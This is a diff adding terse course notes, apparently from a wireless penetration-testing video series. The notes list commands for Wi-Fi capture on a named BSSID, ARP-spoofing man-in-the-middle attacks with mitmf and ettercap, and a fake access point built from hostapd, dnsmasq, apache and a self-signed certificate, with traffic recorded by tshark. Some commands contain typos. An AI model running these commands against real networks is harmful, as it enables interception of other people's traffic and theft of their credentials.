@@ -65,4 +65,75 @@ Section -4
 
 5) airodump-ng wlan0 
 
-6) 
+6) airodump-ng --bssid 50:C7:BF:ED:6B:12 --channel 12 --write airport wlan0 
+
+7) wireshark 
+
+v-17)
+
+8) mitmf --arp --spoof -i wlan0 --gateway 192.168.2.1 
+
+9) route -n 
+
+10) ettercap -Tq -M arp:remote -i wlan0 ///
+
+11) q // quit wireshark using quit in the keyboard 
+
+v-18)
+
+ Nothing 
+
+v-19)
+
+12) service apache2 start 
+
+13)apt-get install geany
+
+v-23)
+
+14) apt-get install hostapd dnsmasq
+
+15) ifconfig 
+
+16) service network-manager stop
+
+v-24)
+
+17) dnsmasq -C /root/downloads/fake-ap/dnsmasq.conf 
+
+18) hostapd /root/Downloads/fake-ap/hostapd.conf -B 
+
+19) ifconfig wlan0 10.0.0.1 netmask 255.255.255.0
+
+20) service apache2 start
+
+v-25)
+
+21) leafpad /etc/apache2/sites-enabled/000-default.conf 
+
+22) service apache2 restart 
+
+v-26)
+
+23) openssl req -new -x509 -days 365 -out /root/Downloads/fake-ap/cert.pem -keyout /root/Downloads/fake-ap/cert.key                               
+
+v-27)
+
+24) a2enmod ssl 
+
+25) leafpad /etc/apache2/sites-enabled/00-default.conf 
+
+26) leafpad /etc/apache2/ports.conf 
+
+
+v-28)
+
+1) hostpad /root/Downloads/fake-ap/hostapd.conf -B 
+
+2) tshark -i wlan0 -w royal-wifi.cap
+
+3) wireshark 
+
+4)
+
+
